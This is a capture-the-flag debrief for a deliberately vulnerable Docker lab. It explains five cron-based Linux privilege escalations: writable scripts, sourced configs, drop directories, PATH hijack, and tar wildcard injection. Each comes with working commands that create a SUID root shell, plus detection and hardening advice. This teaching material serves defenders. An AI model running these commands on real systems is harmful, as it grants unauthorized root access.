# Chapter 02 — Debrief / Full Writeup

> Spoilers ahead. This is the blue-team-grade debrief: every path to root on
> `hollow-backup-01`, **why** it works, how a defender **detects** it, and how
> they **fix** it. Work the box from [README.md](README.md) first.

---

## Background: what cron actually is

**cron** is the Unix job scheduler. The daemon (`cron`/`crond`) wakes once a
minute and runs any job whose time has come. Crucially, **each job runs as the
user who owns the schedule**. System schedules live in:

- `/etc/crontab` and `/etc/cron.d/*` — each line carries an explicit **user**
  field (`m h dom mon dow  user  command`), usually `root`.
- `/etc/cron.hourly|daily|weekly|monthly/` — scripts run as root via `run-parts`.
- `/var/spool/cron/crontabs/<user>` — per-user crontabs (run as that user).

A root cron job is **root's code on a timer**. It never needed to be tricked into
spawning a shell (that was Chapter 01's SUID story) — it *already* runs as root,
on its own, every minute. The attacker's whole job is to change **what** it runs.
Every path below is one answer to: *"what does this root job trust that I can
write?"*

**Enumerate everything scheduled:**

```bash
cat /etc/crontab 2>/dev/null
cat /etc/cron.d/* 2>/dev/null
ls -la /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly
crontab -l 2>/dev/null            # your own
# watch jobs fire live, no root needed:
./pspy64                          # if you brought it in your kit
```

On this host, the scheduled jobs are:

```
/etc/cron.d/rtr-rotate   -> /opt/maint/rotate.sh          # Station A
/etc/cron.d/rtr-backup   -> /usr/local/sbin/backup-run.sh # Station B
/etc/cron.d/rtr-jobs     -> /usr/local/sbin/run-jobs.sh   # Station C
/etc/cron.d/rtr-health   -> /usr/local/sbin/health-report.sh (PATH=...)  # Station D
/etc/cron.d/rtr-archive  -> /usr/local/sbin/archive.sh    # Station E
```

Each job is correct on its face (root-owned, `0644`). The bug is always one
`ls -la` away: a file, config, directory, `$PATH`, or wildcard the job reaches
for that **you can write**. Let's take them in order.

> **A note on the payload.** Every station ends the same way, so the examples
> reuse one classic move: make a root-owned copy of bash with the SUID bit set,
> then run it with `-p` to keep root. (The lab's self-test instead reads the flag
> straight out; both prove root.)
> ```bash
> cp /bin/bash /tmp/rootbash && chmod 6777 /tmp/rootbash   # root does this via cron
> /tmp/rootbash -p                                         # you do this after
> id; cat /root/flag.txt
> ```

---

## Station A — world-writable cron script · ★☆☆☆

### 1. Recon
```bash
cat /etc/cron.d/rtr-rotate
# * * * * * root /opt/maint/rotate.sh
ls -la /opt/maint/rotate.sh
# -rwxrwxrwx 1 root root ... /opt/maint/rotate.sh     <-- world-writable!
```
A root job runs `rotate.sh` every minute, and the script is `0777`.

### 2. The flaw
The schedule is fine; the **script it runs is world-writable**. You can append
anything to a file that root will execute, unmodified, on the next tick.

### 3. Exploit
```bash
echo 'cp /bin/bash /tmp/rootbash && chmod 6777 /tmp/rootbash' >> /opt/maint/rotate.sh
# wait up to 60s for the next tick, then:
/tmp/rootbash -p
id                 # euid=0(root)
cat /root/flag.txt
```

### 4. Why it works
cron runs `rotate.sh` as `root`. Appending to the file changes what root
executes — there's no privilege check on *content*, only on *who runs it*, and
that's already root. `chmod 6777` sets the SUID (and SGID) bit on the bash copy;
`-p` tells bash not to drop the inherited `euid=0`. Instant, persistent root.

### 5. Detect
```bash
# World-writable files executed by cron are the whole bug class:
find / -perm -0002 -type f 2>/dev/null            # all world-writable files
# Cross-reference with scripts referenced in /etc/cron.d, /etc/crontab, cron.*
```
With auditd, watch `-w /opt/maint/rotate.sh -p wa` for writes, and alert on any
cron-run script that is group/other-writable.

### 6. Harden
- `chmod 755` (or `700`) and `chown root:root` every script a root job runs.
- Scripts root executes should live under a root-only path (`/usr/local/sbin`,
  `/opt/<app>/bin`) that no service account can write to.
- CI/monitoring rule: *no cron-referenced file may be writable by group/other.*

### 7. Real world
The single most common cron privesc on CTF/OSCP boxes and in real audits: an
admin `chmod 777`'d a maintenance script "just to get it working" during an
incident, and it stuck. LinPEAS flags writable cron scripts automatically.

---

## Station B — world-writable config a root script sources · ★★☆☆

### 1. Recon
```bash
cat /etc/cron.d/rtr-backup
# * * * * * root /usr/local/sbin/backup-run.sh
ls -la /usr/local/sbin/backup-run.sh
# -rwxr-xr-x 1 root root ...    <-- you CAN'T edit this one
cat /usr/local/sbin/backup-run.sh
#   . /etc/rtr/backup.conf       <-- it sources a config
ls -la /etc/rtr/backup.conf
# -rw-rw-rw- 1 root root ...     <-- ...and THAT is world-writable!
```

### 2. The flaw
The script is locked down (`0755`, root-owned) — so beginners move on. But it
`source`s `/etc/rtr/backup.conf`, and **`source` (`.`) executes the file** in the
script's shell. The config is `0666`. The *inputs* to the job are as dangerous as
the job itself.

### 3. Exploit
```bash
echo 'cp /bin/bash /tmp/rootbash && chmod 6777 /tmp/rootbash' >> /etc/rtr/backup.conf
# wait <=60s, then:
/tmp/rootbash -p
id; cat /root/flag.txt
```

### 4. Why it works
`. /etc/rtr/backup.conf` runs every line of the config as shell commands in the
root process. The author intended "just variables" (`SRC=...`, `DEST=...`) — but
`source` makes no such distinction. Your appended command runs as root before the
script even gets to its backup.

### 5. Detect
- Static review: grep cron-run scripts for `source`/`.`, `eval`, and config files
  they read, then check the **permissions of those inputs**, not just the script.
- `find /etc -perm -0002 -type f 2>/dev/null` — world-writable config under `/etc`
  is almost always wrong.

### 6. Harden
- `chmod 644` / `chown root:root` every config a root job reads.
- Don't `source` a config for values — **parse** it (read `key=value` lines),
  so a config can only *set data*, never *run code*.
- Keep config under a root-only directory.

### 7. Real world
Extremely common in home-grown "backup" and "deploy" wrappers that `source` an
`.env`/`.conf`. The script passes review because *it* is secure; the writable
input it trusts is the hole. Same root cause as writable sourced profiles
(`~/.bashrc`, `/etc/profile.d/*`) executed by privileged shells.

---

## Station C — world-writable drop directory · ★★☆☆

### 1. Recon
```bash
cat /etc/cron.d/rtr-jobs
# * * * * * root /usr/local/sbin/run-jobs.sh
cat /usr/local/sbin/run-jobs.sh
#   for s in /opt/jobs/*.sh; do ... /bin/bash "$s"; done
ls -ld /opt/jobs
# drwxrwxrwx ... /opt/jobs        <-- world-writable directory
```

### 2. The flaw
A root job runs **every** `*.sh` in `/opt/jobs`, and that directory is `0777`.
You don't need to edit an existing file — you **add a new one**, and the sweep
runs it as root.

### 3. Exploit
```bash
cat > /opt/jobs/zz-pwn.sh <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash && chmod 6777 /tmp/rootbash
EOF
chmod +x /opt/jobs/zz-pwn.sh
# wait <=60s, then:
/tmp/rootbash -p
id; cat /root/flag.txt
```

### 4. Why it works
The trust boundary is the **directory**, not any single file. A writable
directory means you control its *contents*, so "run everything in here as root"
becomes "run whatever I drop, as root." The glob `/opt/jobs/*.sh` happily picks
up your new script.

### 5. Detect
```bash
find / -type d -perm -0002 2>/dev/null     # world-writable directories
```
Flag any directory that a root job iterates/executes and that is group/other
writable. auditd `-w /opt/jobs -p wa` catches new files.

### 6. Harden
- `chmod 755` / `chown root:root` any directory whose contents root executes;
  only root should be able to add files there.
- If users must submit jobs, have them land in a staging area that a vetting step
  copies from — never execute a user-writable directory directly.

### 7. Real world
"Drop a script in this folder and it'll run" is a common pattern for backup
agents, deploy hooks, and `/etc/cron.hourly`-style directories. Leave the drop
directory world-writable and it's instant root. `run-parts` directories left
writable are the canonical case.

---

## Station D — PATH hijack in the cron environment · ★★☆☆

### 1. Recon
```bash
cat /etc/cron.d/rtr-health
# PATH=/opt/maint/bin:/usr/bin:/bin
# * * * * * root /usr/local/sbin/health-report.sh
cat /usr/local/sbin/health-report.sh
#   df -h > /var/log/rtr/disk.log 2>&1     <-- calls 'df' by BARE NAME
ls -ld /opt/maint/bin
# drwxrwxrwx ... /opt/maint/bin            <-- writable, and FIRST in PATH
```

### 2. The flaw
The cron entry sets its own `PATH` with a **world-writable directory first**, and
the job calls `df` with no absolute path. The shell resolves `df` left-to-right
through `PATH`, so it finds **your** `df` in `/opt/maint/bin` before the real one.

### 3. Exploit
```bash
cat > /opt/maint/bin/df <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash && chmod 6777 /tmp/rootbash
EOF
chmod +x /opt/maint/bin/df
# wait <=60s, then:
/tmp/rootbash -p
id; cat /root/flag.txt
```

### 4. Why it works
cron exports the `PATH` from the crontab into the job's environment. The job's
`df` is a **bare command name**, so `PATH` decides which file runs — and the
writable `/opt/maint/bin` is first. Your `df` runs as root. This is Chapter 01's
PATH hijack (Station C) in a scheduled context: same root cause (CWE-426
Untrusted Search Path), now you just wait for the tick instead of running the
binary yourself.

### 5. Detect
- Review every `/etc/cron.d`/crontab `PATH=` line; any user-writable directory on
  it (especially first) is a finding.
- Review cron-run scripts for bare command names; prefer absolute paths.
- Runtime: a root cron exec'ing a binary out of a user-writable dir is a strong
  auditd signal.

### 6. Harden
- Don't put writable directories on a privileged `PATH`; keep cron `PATH` minimal
  and root-owned (`/usr/sbin:/usr/bin:/sbin:/bin`).
- Call externals by **absolute path** inside scripts (`/usr/bin/df`).
- Set `PATH` explicitly at the top of the script to a known-good value.

### 7. Real world
cron's default/searched `PATH` has produced countless privescs — vendor "agents"
and init/cron scripts that call `ps`, `gzip`, `service`, `df` by name while a
writable dir sits on `PATH`. HTB *Magic* is the SUID cousin; cron boxes abound.

---

## Station E — wildcard injection in a cron backup · ★★★☆

### 1. Recon
```bash
cat /etc/cron.d/rtr-archive
# * * * * * root /usr/local/sbin/archive.sh
cat /usr/local/sbin/archive.sh
#   cd /opt/data && /usr/bin/tar czf /opt/backups/data.tgz *   <-- unquoted *
ls -ld /opt/data
# drwxrwxrwx ... /opt/data        <-- you can create files here
```

### 2. The flaw
A root job runs `tar czf ... *` **inside a directory you can write to**. The
shell expands `*` to the filenames in `/opt/data` and passes them to `tar` as
arguments. If a filename *looks like a tar option*, tar obeys it — and
`--checkpoint-action=exec=` runs an arbitrary command.

### 3. Exploit
```bash
cd /opt/data
cat > runme.sh <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash && chmod 6777 /tmp/rootbash
EOF
chmod +x runme.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh runme.sh'
# wait <=60s for the cron tar, then:
/tmp/rootbash -p
id; cat /root/flag.txt
```

### 4. Why it works
`*` is expanded by the **shell**, not by tar, so the files you created become
command-line arguments:
```
tar czf /opt/backups/data.tgz --checkpoint=1 '--checkpoint-action=exec=sh runme.sh' readme.txt runme.sh
```
`--checkpoint=1` tells tar to fire an action every record; `--checkpoint-action=
exec=sh runme.sh` makes that action run `sh runme.sh` — as root. This is
**argument injection** via filenames (CWE-88), the classic "tar wildcard" attack.
`rsync -e`, `chown --reference=`, and `7z`/`zip` have equivalent tricks.

### 5. Detect
- Grep cron-run scripts for unquoted globs passed to `tar`, `chown`, `chmod`,
  `rsync`, `zip`, run from user-writable directories.
- Alert on files whose names begin with `-`/`--` in data directories.
- auditd on `execve` of `sh`/`bash` as a child of `tar` is a dead giveaway.

### 6. Harden
- Never run `tar *` (or any `*`) over an untrusted directory. Use `--` to end
  option parsing and an explicit list, or `find ... -print0 | tar --null -T -`.
- Use an absolute, non-writable source path, or `tar -C dir .` with `./` so
  filenames can't be read as options.
- Run backups as an unprivileged service account, not root.

### 7. Real world
The canonical "tar wildcard / checkpoint" privesc — a staple of cron-based boxes
and a real finding in home-grown backup jobs. Documented widely (e.g. the
`--checkpoint-action=exec` technique) and flagged by LinPEAS when it sees a
writable dir backed up by a root cron.

---

## Scoreboard

| Station | The writable thing | Primitive | Difficulty |
|---------|--------------------|-----------|:----------:|
| A | the cron **script** | edit what root runs | ★☆☆☆ |
| B | a **config** it `source`s | `source` executes it | ★★☆☆ |
| C | a **directory** it sweeps | drop a root-run script | ★★☆☆ |
| D | a dir first on its **`$PATH`** | PATH hijack (bare command) | ★★☆☆ |
| E | a **data dir** it `tar *`s | wildcard/argument injection | ★★★☆ |

**The through-line:** a root cron job is root's code on a timer. You win whenever
you can write *something it trusts* — the script (A), its config (B), its drop
directory (C), a command on its `PATH` (D), or the filenames its wildcard expands
(E). Secure scheduled jobs run the minimum privilege needed, execute only
root-owned files in root-owned directories, use absolute paths, parse configs
instead of sourcing them, and never let a wildcard meet an untrusted directory.

---

## Clean up / reset

```bash
# from the repo root on your host
docker compose up -d --build --force-recreate target-cron
```
Rebuilds the box back to pristine-vulnerable (fresh flag, all five stations armed).
